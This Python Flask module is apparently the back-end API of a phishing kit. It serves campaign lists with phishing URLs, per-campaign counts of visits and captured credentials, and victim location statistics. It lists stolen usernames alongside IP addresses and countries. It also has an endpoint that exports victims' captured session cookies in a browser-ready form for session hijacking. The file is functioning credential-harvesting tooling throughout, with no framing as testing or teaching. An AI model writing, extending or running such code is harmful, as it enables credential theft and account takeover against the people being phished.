import json
from flask import Blueprint, request, jsonify
from flask_login import login_required
from app import db
from models import Campaign, CapturedCredential, SessionLog
from core.analytics import Analytics

api_bp = Blueprint('api', __name__)

@api_bp.route('/campaigns')
@login_required
def get_campaigns():
    campaigns = Campaign.query.all()
    return jsonify([{
        'id': c.id,
        'name': c.name,
        'description': c.description,
        'is_active': c.is_active,
        'created_at': c.created_at.isoformat(),
        'phish_url': c.phish_url
    } for c in campaigns])

@api_bp.route('/campaigns/<int:campaign_id>/stats')
@login_required
def get_campaign_stats(campaign_id):
    campaign = Campaign.query.get_or_404(campaign_id)
    
    stats = {
        'total_visits': SessionLog.query.filter_by(campaign_id=campaign_id).count(),
        'captured_credentials': CapturedCredential.query.filter_by(campaign_id=campaign_id).count(),
        'unique_ips': len(set([log.ip_address for log in SessionLog.query.filter_by(campaign_id=campaign_id).all()]))
    }
    
    return jsonify(stats)

@api_bp.route('/analytics/timeline')
@login_required
def get_analytics_timeline():
    analytics = Analytics()
    timeline = analytics.get_capture_timeline()
    return jsonify(timeline)

@api_bp.route('/analytics/locations')
@login_required
def get_analytics_locations():
    analytics = Analytics()
    locations = analytics.get_location_statistics()
    return jsonify(locations)

@api_bp.route('/logs/recent')
@login_required
def get_recent_logs():
    limit = request.args.get('limit', 10, type=int)
    
    credentials = CapturedCredential.query.order_by(
        CapturedCredential.captured_at.desc()
    ).limit(limit).all()
    
    return jsonify([{
        'id': c.id,
        'campaign': c.campaign.name,
        'username': c.username,
        'ip_address': c.ip_address,
        'country': c.country,
        'captured_at': c.captured_at.isoformat()
    } for c in credentials])

@api_bp.route('/export/cookies/<int:credential_id>')
@login_required
def export_cookies(credential_id):
    """Export captured session cookies in browser-compatible format"""
    credential = CapturedCredential.query.get_or_404(credential_id)
    
    # Get associated session logs
    session_logs = SessionLog.query.filter_by(
        campaign_id=credential.campaign_id,
        ip_address=credential.ip_address
    ).all()
    
    cookies = []
    for log in session_logs:
        if log.cookies:
            try:
                cookie_data = json.loads(log.cookies)
                for name, value in cookie_data.items():
                    cookies.append({
                        'name': name,
                        'value': value,
                        'domain': credential.campaign.template.target_domain or '.example.com',
                        'path': '/',
                        'secure': False,
                        'httpOnly': False
                    })
            except:
                pass
    
    return jsonify(cookies)

@api_bp.route('/webhook/notify', methods=['POST'])
def webhook_notify():
    """Webhook endpoint for external notifications"""
    data = request.get_json()
    
    # Basic webhook validation
    if not data or 'event' not in data:
        return jsonify({'error': 'Invalid webhook data'}), 400
    
    # Log webhook event
    print(f"[WEBHOOK] Received: {data['event']}")
    
    return jsonify({'status': 'received'})
